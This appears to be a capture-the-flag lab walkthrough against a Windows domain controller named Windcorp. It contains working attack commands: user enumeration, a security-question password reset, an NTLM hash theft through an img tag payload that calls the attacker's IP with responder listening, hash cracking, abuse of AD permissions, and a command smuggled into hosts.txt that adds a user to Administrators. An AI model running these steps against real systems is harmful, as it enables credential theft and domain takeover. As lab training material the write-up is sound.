It's time to scan the target ip with nmap:
```bash
nmap -sC -sV -p- 10.10.232.200

Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-15 22:16 CEST
Nmap scan report for 10.10.232.200
Host is up (0.057s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE             VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http                Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2023-11-15 22:16:45Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
```
there is a 80 open port that we can visit it, inside the website we found interesting things: the first one is the _reset password button_ maybe it could be used to change someone password and the second one is
a possible user list.

My first move is to save the severals names and surnames in a .txt,  generate a possible userlist and check it with kerbrute tool:

```txt
 Antonietta Vidal
 Britney Palmer
 Brittany Cruz
 Carla Meyer
 Buse Candan
 Edeltraut Daub
 Edward Lewis
 Emile Lavoie
 Emile Henry
 Emily Anderson
 Hemmo Boschma
 Isabella Hughes
 Isra Saur
 Jackson Vasquez
 Jaqueline Dittmer
 Kirk Uglas
 Emily Jensen
 Lily Levesque
```

```bash
python3 namemash.py list.txt >> userlist.txt
```

```bash
kerbrute userenum -d WINDCORP --dc 10.10.232.200 userlist.txt
```

```
buse
edeltraut
edward
emile
lilyle
```

We found some users, the second thing to see is the reset password button, if we click on it, it tells us to add a new subdomain called _"fire.windcorp.thm"_ at _/etc/hosts_, once added it we see 
who is possible to reset passowrd of a user by guessing the secure question.

The user to reset password is lilyle because: the third secure question is _what is your favorite pets name?_, if we scroll down we can view an image of lilyle and is little dog, if we do _rigthclick-> open image in new tab_ 
in the new tab is written _lilyleAndSparky.jpg_ therefore inside the reset button we enter the user lilyle, third question and the answer Sparky we can obtain a new password _ChangeMe#1234_.

Now let's try to use the new credential against smb for example:

```bash
crackmapexec smb 10.10.232.200 -u 'lilyle' -p 'ChangeMe#1234' --shares

SMB         10.10.232.200   445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.10.232.200   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         10.10.232.200   445    FIRE             [+] Enumerated shares
SMB         10.10.232.200   445    FIRE             Share           Permissions     Remark
SMB         10.10.232.200   445    FIRE             -----           -----------     ------
SMB         10.10.232.200   445    FIRE             ADMIN$                          Remote Admin
SMB         10.10.232.200   445    FIRE             C$                              Default share
SMB         10.10.232.200   445    FIRE             IPC$            READ            Remote IPC
SMB         10.10.232.200   445    FIRE             NETLOGON        READ            Logon server share 
SMB         10.10.232.200   445    FIRE             Shared          READ            
SMB         10.10.232.200   445    FIRE             SYSVOL          READ            Logon server share 
SMB         10.10.232.200   445    FIRE             Users           READ            
```

The most suspicious is _Shared_ we can view it with smbclient:

```bash
smbclient \\\\10.10.232.200\\Shared -U lilyle

smb: \> ls
  .                                   D        0  Sat May 30 02:45:42 2020
  ..                                  D        0  Sat May 30 02:45:42 2020
  Flag 1.txt                          A       45  Fri May  1 17:32:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 02:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 13:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 13:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 13:07:24 2020
```

Inside we can retrieve the first flag and go on with the spark 2.8.3 instead if we search on internet there is a possible exploit [CVE-2020-12772](https://vulmon.com/searchpage?q=igniterealtime+spark+2.8.3), the exploit is simple,
in a chat messagge we can include an img tag with the source refer to our IP with responder up to retrieve the NTLM hash of the target user.

First we download and install the _spark.2.8.3.exe_ (.exe because .deb has som errors with jdk8 and jre8), after download it we enter with lilyle credential, now we must find the target user that it's possible to see inside the
website in fact there is _IT support-staff_ and the user buse it has a green icon on his left so we can suggest that is the target user.

We add _buse@windcorp.thm_ at our contacts, we turn on responder with the following command _sudo responder -I eth0 _ and we send a message with this payload _<img src="10.8.98.143/img.jpg">_; sbam we have the NTLM hash of user buse,
It's time to crack it:

```bash
john hash -w=/usr/share/wordlists/rockyou.txt

```

we enter via WinRM:

```bash
evil-winrm WINDCORP -u buse -p <REDACTED>
```

we're in and we can search around the fileystem.

The most interesting thing it's a script ran by _admin_, called _checkservers.ps1_ inside _C:\Scripts_ (very strange folder inside the C drive), the most part of it is:

```powershell
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p

```

the idea is to modify _hosts.txt_ a powershell command to escalate privileges but we must gain access to brittanycr user.

It's time to run _Sharphound.exe_ (we import in the target machine) and use bloodhund:

```powershell
.\Sharphound.exe

```
we upload the json files inside the bloodhund and in the pathfind we type _from buse to brittanycr_, we can see that buse has _GenericAll_ attribute (it allows to change what we want against brittanycr user), the idea is to change
the password and add her to the Remote Management Users:

```powershell
$Password = ConvertTo-SecureString "<new password>" -AsPlainText -Force
Set-ADAccountPassword -Identity "<username>" -Reset -NewPassword $Password 
```

```powershell
Add-ADGroupMember -Identity "<groupname>" -Members <username>
```

If every step is doing right we can enter with brittanycr via evil-winrm, we  change the content inside _hosts.txt_ with the following command:

```powershell
google.com;net localgroup Administrators buse /add
```

after some minutes type this command on buse shell:

```cmd
whoami /all
```

sbam, we can see that buse is member of Administrators group therefore if we go on the following path _C:\Users\Administrator\Desktop_ we can retrieve and submit the third flag.
